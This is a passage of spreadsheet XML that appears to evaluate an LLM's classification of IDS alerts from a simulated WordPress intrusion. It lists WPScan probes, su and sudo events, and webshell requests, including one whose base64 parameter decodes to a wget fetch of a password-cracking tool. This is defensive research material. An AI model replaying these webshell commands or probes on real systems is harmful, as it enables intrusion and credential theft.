            <text:p>Plugin Enumeration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”</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 and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6" calcext:value-type="float">
            <text:p>6</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T4">Web Plugin Enumeration,</text:span></text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code”</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/click-to-chat-for-whatsap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text:span text:style-name="T4">Web Plugin Enumeration,</text:span></text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/constant-contact-form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Web Application Scanning, File Enumeration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code”</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/regenerate-thumbnails-advanced/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Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”, “Multiple web server 400 error codes from same source ip”</text:p>
            <text:p>Raw Data: “GET /academics HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”, “GET /bea HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 404 and attempted access to various potential directory name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Scanning, </text:p>
            <text:p>Log File Enumeration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “GET /access-log.1 HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 404 and attempted access to access log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Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”</text:p>
            <text:p>Raw Data: “GET /bea HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on repeated http status code 404 requests from same IP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Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T4">IDS: “Web server 400 error code.</text:span>”</text:p>
            <text:p>Raw Data: “GET /beheer HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on repeated http status code 404 requests from same IP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Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “GET /wp-admin/user/webcalendar HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on on 404 http status code and attempted access to wp-admin folder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Unauthorized Access Attempt</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Discovery,</text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “GET /wp-content/plugins/_vti_bin/_vti_aut/author.dll HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on on 404 http status code and attempted access to WordPress plugin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Fingerprinting</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/skins/wordpress/images/zh_TW HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on on 404 http status cod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Web Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/skins/wordpress/images/zones HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on on 404 http status code and access to WordPress serv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Valid Account Use</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success” </text:p>
            <text:p>Raw Data: “miller-mail dovecot: imap-login: Login: user=&lt;megan.johnson&gt;, method=PLAI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Protocol Exploitation, </text:p>
            <text:p>Application Layer Anomaly</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA HTTP unable to match response to request”</text:p>
            <text:p>Raw Data: “SURICATA HTTP unable to match response to request [**] [Classification: Generic Protocol Command Decode] [Priority: 3]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name HTTP</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Valid Account Use</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success.”</text:p>
            <text:p>Raw Data: “dovecot: imap-login: Login: user=&lt;john.hammond&gt;, method=PLAIN”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on successful imap login</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Alternate explanation for alert</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>TLS invalid handshake</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid handshake message”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name TLS and IDS message</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Alternate explanation for alert</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>TLS invalid record</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid record/traffic”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name TLS and IDS messag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Brute Force</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “PAM: User login failed”</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PAM user logi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Initial Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “User successfully changed UID”,</text:p>
            <text:p>Raw Data: “intranet-server su[28816]: + /dev/pts/1 www-data:phopkins”</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4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Privilege Escalation, </text:p>
            <text:p>Initial Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “PAM: Login session opened.”,</text:p>
            <text:p>Raw Data: “intranet-server systemd: pam_unix(systemd-user:session): session opened for user phopkins by (uid=0)”</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3" calcext:value-type="float">
            <text:p>3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Privilege Escalation,</text:p>
            <text:p>Defense Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Successful sudo to ROOT executed.”,</text:p>
            <text:p>Raw Data: “intranet-server sudo: phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=list”</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text:p>
            <text:p>Defense Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “PAM: Login session closed.”,</text:p>
            <text:p>Raw Data: “intranet-server sudo: pam_unix(sudo:session): session closed for user root”</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1">
          <table:table-cell/>
          <table:table-cell table:formula="of:=SUM([.B2:.B44])" office:value-type="float" office:value="83" calcext:value-type="float">
            <text:p>83</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="6"/>
        </table:table-row>
      </table:table>
      <table:table table:name="TP_aminer_gemini_run1"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6" calcext:value-type="float">
            <text:p>6</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Command and Control, </text:p>
            <text:p>Exfiltration</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “High entropy in DNS domain”, “Value entropy anomaly detected”</text:p>
            <text:p>Raw Data: dnsmasq[14460]: query[A] youtu.be from [IP]</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name DNS and high entropy in DNS doma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Web Application Attack, </text:p>
            <text:p>Reconnaissance</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probably based on attempted access to web server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 </text:p>
            <text:p>Network Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “TLS error on connection from [192.168.130.77] (gnutls_handshake): An unexpected TLS packet was received.”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name TL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Reconnaissance, </text:p>
            <text:p>Network Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”, </text:p>
            <text:p>Raw Data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 363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 </text:p>
            <text:p>Network Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”, </text:p>
            <text:p>Raw Data: “GET / HTTP/1.0 403 363 - - ”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on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Reconnaissance, </text:p>
            <text:p>Vulnerability Scanning</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Classification probably based on attempted access to web server root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 </text:p>
            <text:p>Network Scanning</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Classification probably based on attempted access to web server root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Reconnaissance, </text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/plugins/akismet/ HTTP/1.1 403 3362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4" calcext:value-type="float">
            <text:p>14</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Reconnaissance, </text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New request method in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/analytics-for-w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Credential Access</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http status code 403 and attempted access to sensitive password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Reconnaissance, </text:p>
            <text:p>Directory Traversal</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http status code 404 and special character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Vulnerability Scanning</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php config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Path Traversal,</text:p>
            <text:p>Information Gathering</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/thickbox/~www HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 404 and special character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 </text:p>
            <text:p>Vulnerability Scanning</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 </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to WordPress directory</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3" calcext:value-type="float">
            <text:p>3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Information Gathering, </text:p>
            <text:p>Vulnerability Scanning, </text:p>
            <text:p>Exploitation for Credential Access</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ttempted access to WordPress directory and sensitive fil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Vulnerability Scanning,</text:p>
            <text:p>Exploitation for Credential Access</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attempted access to WordPress theme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formation Gathering,</text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”, </text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/lost+found HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 404 and special characters</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3" calcext:value-type="float">
            <text:p>3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Vulnerability Scanning,</text:p>
            <text:p>Information Gathering,</text:p>
            <text:p>Web Server Compromise</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Classification probably based on attempted access to php config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Vulnerability Scanning, </text:p>
            <text:p>Information Gathering</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T4">IDS: “New event type.”, “New path(es) detected”</text:span></text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/index.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to php config file in WordPress themes folder</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7" calcext:value-type="float">
            <text:p>7</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Information Gathering,</text:p>
            <text:p>Directory Traversal,</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/images/admin/~logs HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to WordPress themes directory and special characters</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Credential Access,</text:p>
            <text:p>Vulnerability Scanning</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attempted access to WordPress themes admin directory</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Credential Access, </text:p>
            <text:p>Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htpasswd”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to WordPress themes admin directory</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Webshell</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Shell, </text:p>
            <text:p>Command and Control,</text:p>
            <text:p>Exfiltration, </text:p>
            <text:p>Credential Access</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because of base64 encoded payload and decoded mysql request</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Webshell</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Shell, </text:p>
            <text:p>Command and Control,</text:p>
            <text:p>Defense Evasion,</text:p>
            <text:p>Inhibit Response Function</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”</text:p>
            <text:p>Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1 200 506717 - python-requests/2.27.1” </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on high entropy because of base64 encoded payload and decoded wget download request from github</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Password Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Shell, </text:p>
            <text:p>Credential Access, </text:p>
            <text:p>Defense Evasion, </text:p>
            <text:p>Inhibit Response Function</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because of base64 encoded payload, however decoded content (keywords: wphashcrack, rockyou) were not used</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 </text:p>
            <text:p>Application Layer Protocol Confusion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”</text:p>
            <text:p>Raw Data: “POST /services/ajax.php/imp/poll HTTP/1.1 200 463 https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on unusual occurrence frequency of http POST method</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source Hijacking, </text:p>
            <text:p>Impact</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deviation in CPU usage</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Reverse Shell</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Shell, </text:p>
            <text:p>Command and Control, </text:p>
            <text:p>Defense Evasion</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text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on high entropy because of base64 encoded payload and decoded payload containing keywords bash and usage of exec func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Credential Access</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Lateral Movement</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “intranet-server su[28816]: + /dev/pts/1 www-data:phopkin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Credential Access</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Authentication Bypass</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PAM event and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Account Manipulation</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New user_acct parameter combination in Audit logs.”, “New value combination(s) detected”</text:p>
            <text:p>Raw Data: “type=USER_ACCT msg=audit(1642511671.635:2442): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:accounting acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on PAM event and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Credential Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New cred_acq parameter combination in Audit logs.”, “New value combination(s) detected”</text:p>
            <text:p>Raw Data: “type=CRED_ACQ msg=audit(1642511671.663:2443): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:setcred acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success'”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on PAM event and tool name su</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Execution</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probably based on PAM event and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36])" office:value-type="float" office:value="84" calcext:value-type="float">
            <text:p>84</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="6"/>
        </table:table-row>
      </table:table>
      <table:table table:name="TP_wazuh_gemini_run1" table:style-name="ta1">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6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>DNSteal</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="10" calcext:value-type="float">
            <text:p>10</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Legitimate Credentials Abuse, </text:p>
            <text:p>Initial Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success.”, mitre - technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion”, “Persistence”, “Privilege Escalation”, “Initial Access”</text:p>
            <text:p>Raw data: “jonesmorgan-mail dovecot: imap-login: Login: user=&lt;susan.gregory&gt;, method=PLAIN,  rip=192.168.128.170, lip=192.168.128.170, mpid=20031, TLS, session=&lt;Z7YRAMTVOOfAqICq&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6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="5" calcext:value-type="float">
            <text:p>5</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Legitimate Credentials Abuse,  </text:p>
            <text:p>Initial Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “ Defense Evasion”, “Persistence”, “Privilege Escalation”, “Initial Access”</text:p>
            <text:p>Raw data: “taylorcruz-mail dovecot: imap-login: Login: user=&lt;damian.jordan&gt;, method=PLAI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6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Protocol Anomaly,</text:p>
            <text:p>Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid record/traffic”</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6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="3" calcext:value-type="float">
            <text:p>3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Protocol Anomaly,</text:p>
            <text:p>Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid handshake message”</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6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="3" calcext:value-type="float">
            <text:p>3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Protocol Anomaly,</text:p>
            <text:p>Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “IDS event.”,</text:p>
            <text:p>Raw Data: “SURICATA TLS invalid handshake message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6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Protocol Anomaly,</text:p>
            <text:p>Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “IDS event.”,</text:p>
            <text:p>Raw Data: “SURICATA TLS invalid record/traffic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6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Service Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Legitimate Credentials Abuse, </text:p>
            <text:p>Ini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346, TLS, session=&lt;XzJRP9rVHr7AqIDD&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6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Service Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Reconnaissance, </text:p>
            <text:p>Lateral Movement</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “sshd: insecure connection attempt (scan)”, mitre -  technique: “SSH”, id: “T1021.004”, tactic: “Lateral Movement”</text:p>
            <text:p>Raw Data: internal-share sshd[28182]: Did not receive identification string from 172.17.130.196 port 55898</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on logging message</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Service Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Attack,</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”</text:p>
            <text:p>Raw Data: “GET / HTTP/1.0 403 363 - - ”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 403</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Service Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Protocol Anomaly, </text:p>
            <text:p>Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “First time this IDS alert is generated.”, </text:p>
            <text:p>Raw Data: “SURICATA SMTP invalid reply [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name suricata and protocol name SMTP</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Service Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="3" calcext:value-type="float">
            <text:p>3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Attack, </text:p>
            <text:p>Reconnaissance</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attempted access to web server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Vulnerability Scanning,</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”</text:p>
            <text:p>Raw data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 3260 Mozilla/5.0 (compatible; Nmap Scripting Engine; <text:a xlink:href="https://nmap.org/book/nse.html" xlink:type="simple">https://nmap.org/book/nse.html</text:a>)”</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WPScan</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="11" calcext:value-type="float">
            <text:p>11</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Vulnerability Scanning, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw data: “HEAD /wp-content/plugins/change-wp-admin-login/ HTTP/1.1 404 146 <text:a xlink:href="https://intranet.price.fox.org/" xlink:type="simple">https://intranet.price.fox.org</text:a> WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
